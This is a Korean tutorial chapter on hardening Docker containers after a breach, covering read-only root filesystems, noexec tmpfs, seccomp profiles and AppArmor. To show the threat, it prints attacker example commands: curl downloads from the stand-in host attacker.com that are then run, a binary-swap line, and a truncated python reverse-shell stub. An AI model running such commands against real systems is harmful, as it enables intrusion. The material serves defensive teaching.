---
title: 침입한 뒤에 할 수 있는 일을 없앤다
summary: 쓸 자리를 막는 것과 부를 수 있는 시스템 콜을 줄이는 것
versionNote: Docker 28 기준
ord: 4
minutes: 23
edges:
  - { to: capabilities, type: prerequisite }
  - { to: writable-layer, type: prerequisite }
  - { to: secrets, type: deepens }
sources:
  - { label: Docker 공식 문서 - Seccomp security profiles, url: https://docs.docker.com/engine/security/seccomp/ }
  - { label: Docker 공식 문서 - AppArmor security profiles, url: https://docs.docker.com/engine/security/apparmor/ }
  - { label: Linux man page - seccomp(2), url: https://man7.org/linux/man-pages/man2/seccomp.2.html }
---

[[capabilities]] 끝에서 두 가지가 남았다.

**첫째**, `cap-drop=ALL` 로 패키지 매니저는 막혔는데
쓰기 가능한 경로에 **바이너리를 내려받아 실행**하는 것은 된다.

```bash file=terminal
# curl -o /tmp/tool https://attacker.com/tool && chmod +x /tmp/tool && /tmp/tool
```

**둘째**, 컨테이너 안의 프로세스는 **커널에 시스템 콜을 직접 날린다.**
커널 취약점은 대개 특정 시스템 콜을 통해 터지는데,
capability 로는 그 호출 자체를 막을 수 없다.

두 구멍을 각각 다른 수단으로 닫는다.

## 0. 들어가기 전에 — 핵심 용어

- **`--read-only`**: 컨테이너의 루트 파일 시스템을 읽기 전용으로 만든다.
- **시스템 콜(syscall)**: 프로세스가 커널에 일을 요청하는 창구. 300개가 넘는다.
- **seccomp**: 프로세스가 **부를 수 있는 시스템 콜을 제한**하는 커널 기능.
- **프로파일(profile)**: 허용·차단 목록을 적은 JSON 또는 정책 파일.
- **AppArmor / SELinux**: 파일·네트워크 접근을 **경로와 라벨 단위로** 제한하는 정책 시스템.
- **공격 표면(attack surface)**: 공격자가 쓸 수 있는 것들의 총량.

한 줄 그림: **capability 는 "무엇을 할 권한이 있나"를, seccomp 는 "무엇을 부를 수 있나"를 정한다.**

비유하자면 **금고와 전화기**다.
capability 는 **금고 열쇠를 몇 개 주는가**다.
`--read-only` 는 **방 안에 놓을 수 있는 것을 없애는 것**이다. 책상을 치운다.
seccomp 는 **전화기에서 누를 수 있는 번호를 줄이는 것**이다.
열쇠가 없어도 전화로 사람을 부를 수 있는데, 그 전화번호 목록 자체를 깎는다.

## 1. 그전엔 어떻게 했나 — 권한만 줄이기

[[non-root-container]] 와 [[capabilities]] 를 적용했다.
비루트고 조각도 없다. 그런데 남은 것이 있다.

### 고통 1 — 도구를 내려받아 쓴다

```bash file=terminal bad label="비루트 cap-drop=ALL 에서도 되는 일"
$ curl -sL https://attacker.com/scan -o /tmp/s && chmod +x /tmp/s && /tmp/s
```

**패키지 설치는 막혔지만** 바이너리를 내려받아 실행하는 것은 된다.
`/tmp` 는 누구나 쓸 수 있고, 실행 권한도 스스로 줄 수 있다.

그리고 더 쉬운 길이 있다. 이미지에 **이미 인터프리터가 있다.**

```bash file=terminal
$ python3 -c 'import socket,subprocess,os; ...'      # 역쉘
$ node -e 'require("child_process").exec(...)'
```

도구를 안 받아도 된다. **앱의 런타임이 곧 도구**다.

### 고통 2 — 앱 바이너리를 바꿔치기한다

```bash file=terminal
# cp /tmp/evil /app/server && kill 1
```

컨테이너가 재시작하면 **바뀐 바이너리가 뜬다.**
`--restart unless-stopped` 가 공격자를 도와주는 셈이다.

쓰기 층([[writable-layer]])에 쓴 것이라 **호스트에는 흔적이 적고**,
이미지는 멀쩡하므로 **이미지를 검사해도 안 나온다.**

### 고통 3 — 커널 취약점을 시스템 콜로 찌른다

컨테이너 탈출 취약점의 상당수가 **특정 시스템 콜**을 통해 터진다.

```
unshare / clone     → 새 namespace 를 만들어 권한을 혼란시킨다
keyctl              → 커널 키링. 컨테이너 간 유출 이력이 있다
ptrace              → 다른 프로세스 조작
userfaultfd         → 페이지 폴트 처리. 익스플로잇에 쓰였다
bpf                 → eBPF. 강력하고 위험하다
```

capability 를 다 빼도 **이 호출들을 부를 수는 있다.**
권한이 없어서 실패하겠지만, **취약점이 있으면 그 실패 경로에서 터진다.**

### 고통 4 — 예제에서 보호를 끄는 옵션을 복사한다

```bash file=terminal bad label="자주 보이는 옵션"
docker run --security-opt seccomp=unconfined myapp
```

"이걸 넣으니 됐다"는 답이 검색에 많다.
그런데 이건 **Docker 가 기본으로 막아둔 것을 전부 푸는 것**이다.

`--privileged` 와 비슷한 문제다. **무엇을 열었는지 모르고**,
그래서 나중에 줄일 수도 없다.

네 고통의 뿌리는 **하나**다. **권한을 줄이는 것만으로는 부족하다.**
할 수 있는 **자리**와 부를 수 있는 **창구**도 같이 줄여야 한다.

## 2. 이렇게 피해봤다

### 시도 1 — `/tmp` 를 안 쓰게 만든다

고통 1 의 대응이다. 쓰기 가능한 경로를 줄여본다.

**어디든 쓸 수 있으면 된다.** `/dev/shm`, `/var/tmp`,
그리고 앱이 쓰는 데이터 디렉터리. 하나씩 막는 것으로는 끝이 안 난다.

**기본을 뒤집어야** 한다. 전부 막고 필요한 것만 여는 쪽이다.

### 시도 2 — 이미지에서 셸과 인터프리터를 뺀다

distroless 로 간다([[image-size]]). 셸이 없으면 역쉘이 어려워진다.

**효과가 크다.** 그래서 distroless 의 보안 이점이 실질적이다.

다만 **앱의 런타임은 남아 있다.** Node 앱이면 `node` 가 있고,
그걸로 임의 코드를 실행할 수 있다. 그리고 **디버깅이 어려워진다**는
대가는 그대로다.

### 시도 3 — 모니터링으로 잡는다

파일 변경과 수상한 프로세스를 감시한다. Falco 같은 도구다.

**유용하고 실제로 쓴다.** 다만 **사후 탐지**다.
그리고 운영할 것이 하나 늘고, 오탐을 다루는 비용이 든다.

**예방으로 막을 수 있는 것은 예방으로** 막는 것이 먼저다.

> 세 시도의 공통점: **구멍을 하나씩 막으려 했다.**
> 기본을 닫고 필요한 것만 여는 쪽으로 뒤집어야 했다.

## 3. 그래서 나온 것 — 자리를 없애고 창구를 줄인다

### 수단 1 — `--read-only` 로 쓸 자리를 없앤다

```bash file=terminal good label="쓸 자리를 정해주고 나머지는 막는다"
docker run -d \
  --read-only \
  --tmpfs /tmp:rw,noexec,nosuid,size=64m \
  -v app-data:/data \
  myapp
```

[[writable-layer]] 에서 본 것인데, 거기서는 **성능과 수명** 관점이었다.
보안 관점에서는 **공격자가 쓸 자리를 없애는 것**이다.

`noexec` 가 중요하다. `/tmp` 를 열어주되 **거기서 실행은 못 하게** 한다.
고통 1 의 `chmod +x /tmp/s` 가 막힌다.

### 수단 2 — seccomp 로 창구를 줄인다

Docker 는 **기본 프로파일을 이미 적용**하고 있다.

```bash file=terminal
$ docker info --format '{{.SecurityOptions}}'
[name=seccomp,profile=builtin ...]
```

300개 넘는 시스템 콜 중 **40개쯤을 막는다.**
`mount`, `reboot`, `kexec_load`, `bpf` 같은 것들이다.

그러니 고통 4 의 `seccomp=unconfined` 는 **그 보호를 끄는 것**이다.
안 쓰는 것이 맞고, 쓰려면 이유를 적어야 한다.

더 좁히려면 커스텀 프로파일을 쓴다.

```bash file=terminal
docker run --security-opt seccomp=./my-profile.json myapp
```

네 고통과 대응시켜 보자.

| 고통 | 해결 |
| --- | --- |
| 도구를 내려받아 쓴다 | `--read-only` + `--tmpfs noexec`. **쓸 자리와 실행 권한을 없앤다** |
| 바이너리를 바꿔치기한다 | `--read-only` 가 **이미지 경로를 못 고치게** 한다 |
| 시스템 콜로 커널을 찌른다 | **seccomp.** 기본 프로파일을 끄지 않는다 |
| 보호를 끄는 옵션을 복사한다 | `unconfined` 가 무엇을 푸는지 알고 안 쓴다 |

## 4. 어떻게 동작하나 — 네 층이 각각 다른 것을 막는다

```visual
id: readonly-and-seccomp-four-layers
kind: structure
title: 네 가지 수단이 각각 막는 것
nodes:
  - name: 컨테이너 안에서 코드 실행이 가능해졌다
    detail: 침입은 이미 일어났다고 가정한다. 이 상태에서 공격자가 다음 단계로 갈 수 있는 경로가 넷이고, 각각 다른 수단이 막는다
    code: 침입 후 · 다음 단계를 막는다
    children:
      - name: 누구로 도나 — USER
        detail: non-root-container 의 층이다. 비루트면 시스템 파일을 못 고치고 다른 사용자의 프로세스를 못 본다
        code: --user 1001
        children:
          - name: 못 막는 것
            detail: 자기 소유 경로에 쓰는 것, 자기 권한으로 네트워크 나가는 것, 앱 런타임으로 코드 실행하는 것
            code: 자기 권한 내의 모든 것
      - name: 무엇을 할 권한이 있나 — capability
        detail: capabilities 의 층이다. 조각이 없으면 특권 동작을 못 한다. 소유자 변경, 특권 포트, 마운트가 막힌다
        code: --cap-drop=ALL
        children:
          - name: 못 막는 것
            detail: 권한이 필요 없는 일들. 파일을 내려받아 실행하거나 시스템 콜을 부르는 것 자체는 막지 않는다
            code: 비특권 동작
      - name: 어디에 쓸 수 있나 — read-only
        detail: 쓸 자리를 없앤다. 이미지 경로를 못 고치므로 바이너리 바꿔치기가 막히고, tmpfs 에 noexec 를 걸면 내려받아 실행하는 것도 막힌다
        code: --read-only --tmpfs /tmp:noexec
        children:
          - name: 막는 것
            detail: 도구 설치, 바이너리 교체, 지속성 확보. 침입이 재부팅을 넘어 남는 것을 어렵게 한다
            code: 쓰기 기반 공격 전부
          - name: 못 막는 것
            detail: 메모리에서만 도는 공격. 앱 런타임으로 코드를 실행하는 것은 디스크를 안 쓴다
            code: 인메모리 실행
      - name: 무엇을 부를 수 있나 — seccomp
        detail: 시스템 콜 목록 자체를 깎는다. 다른 셋이 전부 막지 못하는 층이다. 커널 취약점에 닿는 경로를 줄인다
        code: 기본 프로파일 유지
        children:
          - name: 막는 것
            detail: mount, reboot, kexec_load, bpf 등 40개쯤. 커널 익스플로잇에 쓰인 호출들이 여기 포함된다
            code: 커널 공격 경로
          - name: 커스텀으로 더 좁힐 수 있다
            detail: 앱이 실제로 쓰는 호출만 허용한다. 효과는 크지만 만들고 유지하는 비용이 든다
            code: 앱별 프로파일
      - name: 그리고 소켓과 privileged 는 이 전부를 우회한다
        detail: docker-socket 과 capabilities 에서 본 것이다. 그 둘이 열려 있으면 이 네 층이 의미가 없다. 먼저 닫아야 한다
        code: 선행 조건
```

### 쓰기 경로를 찾는 법

`--read-only` 를 켜면 대개 앱이 안 뜬다. **어디에 쓰는지 찾아야** 한다.

```bash file=terminal
$ docker run --read-only myapp 2>&1 | grep -i 'read-only\|EROFS\|denied'
Error: EROFS: read-only file system, open '/app/logs/app.log'
Error: EROFS: read-only file system, mkdir '/app/.cache'
```

**실패 경로가 로그에 나온다.** 하나씩 판단한다.

```
/tmp, /run, /var/run    → tmpfs. 사라져도 된다
/app/.cache             → tmpfs. 재생성 가능
/app/logs               → stdout 으로 바꾼다. 애초에 파일로 쓸 이유가 없다
/data                   → 볼륨. 살아남아야 한다
```

`/app/logs` 가 나왔다면 **설정을 고치는 것**이 맞다.
[[container-is-a-process]] 에서 본 "로그는 stdout 으로"가 여기서 보안 이득이 된다.

읽기 전용을 켜는 순서를 따라가면 막막함이 사라진다.

```visual
id: readonly-and-seccomp-enabling-steps
kind: step
title: read-only 를 켜고 쓸 자리를 찾아가는 순서
steps:
  - name: 1. 그냥 켜본다
    detail: 무엇이 필요한지 추측하지 않는다. 켜고 깨지게 만든 뒤 로그를 읽는 쪽이 빠르고 정확하다
    code: docker run --read-only myapp
  - name: 2. EROFS 가 난 경로를 모은다
    detail: 실패 메시지에 경로가 그대로 나온다. 이 목록이 곧 그 앱의 쓰기 경로 전체이고 문서보다 정확하다
    code: grep -i 'EROFS\|read-only'
  - name: 3. 사라져도 되는 것은 tmpfs 로
    detail: /tmp, /run, 캐시 디렉터리가 여기 해당한다. noexec 를 붙여 거기서 실행하는 것까지 막는다
    code: --tmpfs /tmp:rw,noexec,nosuid,size=64m
  - name: 4. 살아남아야 하는 것은 볼륨으로
    detail: 데이터와 업로드 파일이다. 업로드 경로에는 반드시 noexec 를 건다. 사용자가 올린 파일이 실행 가능해지는 것이 흔한 사고다
    code: -v app-data:/data
  - name: 5. 로그 경로가 나왔으면 설정을 고친다
    detail: 쓸 자리를 열어주는 것보다 stdout 으로 내보내는 것이 낫다. 컨테이너를 지워도 로그가 남고 수집도 쉬워진다
    code: 파일 대신 stdout
  - name: 6. tmpfs 크기를 반드시 지정한다
    detail: 크기를 안 주면 호스트 메모리 절반까지 쓸 수 있다. 그리고 쓴 만큼이 cgroups 의 메모리 한도에 포함되어 OOM 을 유발한다
    code: size=64m
  - name: 7. 남은 조치를 같이 적용한다
    detail: 비루트, cap-drop ALL, no-new-privileges 와 함께 쓴다. 넷이 각각 다른 층을 막으므로 같이 적어야 의미가 있다
    code: 네 줄로 네 층
```

### 어디까지 조일까

```visual
id: readonly-and-seccomp-how-far
kind: playground
title: 이 애플리케이션에 어디까지 적용하나
inputs:
  - { name: 앱, label: 어떤 앱, options: [일반 웹 API, 파일 업로드를 받는 앱, 이미지 변환 워커, 레거시 앱, 외부에 노출된 프록시] }
  - { name: 수단, label: 적용할 것, options: [read-only, tmpfs noexec, seccomp 기본 유지, 커스텀 seccomp] }
outcomes:
  - when: { 앱: 일반 웹 API, 수단: read-only }
    result: 대개 그냥 된다. tmpfs 로 /tmp 만 열어주면 충분한 경우가 많다
    note: 상태를 디스크에 안 두는 앱이면 비용이 거의 없다. 먼저 켜보고 실패 로그를 보는 것이 가장 빠른 확인이다
  - when: { 앱: 파일 업로드를 받는 앱, 수단: read-only }
    result: 업로드 경로를 볼륨으로 빼고 나머지를 읽기 전용으로 한다
    note: 업로드 경로에는 noexec 를 반드시 건다. 사용자가 올린 파일이 실행 가능해지는 것이 가장 흔한 사고다
  - when: { 앱: 이미지 변환 워커, 수단: tmpfs noexec }
    result: 임시 파일을 많이 쓰므로 tmpfs 크기를 넉넉히 주고 noexec 를 건다
    note: tmpfs 는 메모리라 cgroups 의 메모리 한도에 포함된다. 크기를 안 주면 호스트 메모리 절반까지 쓸 수 있어 OOM 위험이 있다
  - when: { 앱: 레거시 앱, 수단: read-only }
    result: 어디에 쓰는지 모르는 경우가 많다. 일단 켜고 실패 경로를 하나씩 열어준다
    note: 로그에 EROFS 가 나오는 경로를 모으면 그것이 곧 쓰기 경로 목록이다. 문서보다 정확하다
  - when: { 앱: 외부에 노출된 프록시, 수단: 커스텀 seccomp }
    result: 투자할 가치가 있다. 공격 표면이 가장 넓은 자리다
    note: nginx 같은 것은 쓰는 시스템 콜이 비교적 정해져 있어 프로파일을 만들기 쉽다. 다만 버전 업그레이드 때 다시 검증해야 한다
  - when: { 수단: seccomp 기본 유지 }
    result: 모든 경우에 해당한다. 끄지 않는 것만으로 충분한 방어가 된다
    note: unconfined 를 쓰는 예제를 복사하지 않는 것이 실질적인 조치다. 왜 필요한지 설명할 수 없으면 쓰지 않는다
  - when: { 수단: 커스텀 seccomp }
    result: 비용이 크다. 노출도가 높은 소수의 서비스에만 적용하는 것이 현실적이다
    note: 앱이 쓰는 호출을 전부 알아내야 하고 런타임 버전이 바뀌면 달라진다. 기본 프로파일로 대부분의 이득을 이미 얻고 있다
```

### AppArmor 와 SELinux

seccomp 가 **시스템 콜**을 제한한다면, 이쪽은 **경로와 객체**를 제한한다.

```bash file=terminal
$ docker info --format '{{.SecurityOptions}}'
[name=apparmor name=seccomp,profile=builtin]
```

Docker 는 `docker-default` 라는 AppArmor 프로파일을 자동 적용한다.
`/proc` 과 `/sys` 의 민감한 경로에 쓰는 것을 막는다.

```
seccomp   : mount 라는 호출 자체를 막는다
AppArmor  : /proc/sys 에 쓰는 것을 막는다 (호출은 되지만 대상이 막힌다)
```

**둘이 겹치면서 다르다.** 겹치는 것은 괜찮고, 서로 못 막는 부분을 메운다.

RHEL 계열은 SELinux 를 쓴다. `--security-opt label=...` 로 조절하고,
볼륨 마운트에 `:z` / `:Z` 를 붙여야 하는 경우가 그 때문이다.

## 5. 이것도 끝이 아니다 — 비밀은 어디에 두나

권한을 줄이고 자리를 없애고 창구를 깎았다.
침입 후 할 수 있는 일이 많이 줄었다.

그런데 **읽을 수 있는 것**은 그대로다.

```bash file=terminal
$ docker run --rm --user 1001 --cap-drop=ALL --read-only myapp env
DB_PASSWORD=secret123
STRIPE_SECRET_KEY=sk_live_...
```

**환경변수는 읽힌다.** 비루트든 읽기 전용이든 상관없다.
자기 프로세스의 환경변수니까 당연히 읽는다.

[[arg-vs-env]] 에서 "환경변수는 비밀을 숨기는 수단이 아니다"라고 했고,
[[compose-env]] 에서 "파일 마운트가 낫다"고만 하고 넘어갔다.

비밀을 넣을 자리마다 함정이 있다. 어디에 어떻게 둬야 하는지
[[secrets]] 에서 정리한다.

## 자기 점검

- 읽기 전용으로 만들면 공격자가 구체적으로 무엇을 못 하게 되는가?
- 애플리케이션이 쓰기를 필요로 하는 경로를 어떻게 찾는가?
- `tmpfs` 에 `noexec` 를 붙이는 것이 막는 것은?
- 예제에서 `seccomp=unconfined` 를 보면 왜 의심해야 하는가?
- capability 와 seccomp 가 막는 대상은 어떻게 다른가?

## 덧 — 흔한 오해

### "`--read-only` 면 볼륨도 못 쓴다"

**볼륨은 별개다.** 루트 파일 시스템만 읽기 전용이 된다.

```bash file=terminal
$ docker run --read-only -v data:/data alpine sh -c 'touch /data/x && echo ok'
ok
$ docker run --read-only -v data:/data alpine sh -c 'touch /x'
touch: /x: Read-only file system
```

**명시적으로 마운트한 곳만 쓸 수 있다.** 그게 의도다.
"어디에 쓰는가"가 설정에 전부 드러나고, 그 외에는 쓸 수 없다.

쓰기 경로가 **감사 가능해진다**는 점이 보안 이득의 절반이다.

### "seccomp 는 성능에 영향이 크다"

**측정 가능한 수준이 아니다.** 커널이 BPF 필터로 처리하므로
시스템 콜당 수십 나노초 수준이다.

```
기본 프로파일   : 체감 불가
커스텀 프로파일 : 규칙 수에 따라 조금 늘지만 여전히 미미하다
```

성능을 이유로 `seccomp=unconfined` 를 쓰는 것은 근거가 약하다.
**실제로 그 옵션을 쓰는 이유는 대개 "안 되는 것이 있어서"**다.
그 경우 무엇이 막혔는지 찾아 **그 호출만** 허용하는 프로파일을 만드는 것이 맞다.

```bash file=terminal
$ docker run --rm --security-opt seccomp=unconfined myapp strace -f -c ./app 2>&1 | tail -20
# 쓰는 시스템 콜 목록을 얻어 프로파일을 만든다
```

### "이 전부를 적용하면 안전하다"

**층을 쌓은 것이고 완전하지 않다.**

```
막은 것   : 침입 후 권한 상승, 도구 설치, 지속성 확보, 일부 커널 공격
안 막은 것 : 침입 자체, 애플리케이션 취약점, 메모리에서만 도는 공격,
            네트워크를 통한 측면 이동, 그리고 비밀 읽기
```

그리고 **가장 중요한 것이 빠져 있다.**
[[docker-socket]] 과 `--privileged` 가 열려 있으면 **이 전부가 우회된다.**

그래서 순서가 있다.
**소켓을 닫고, 비루트로 돌리고, 조각을 버리고, 자리를 없애고, 창구를 줄인다.**
앞의 것을 안 하고 뒤의 것만 하는 것은 효과가 거의 없다.
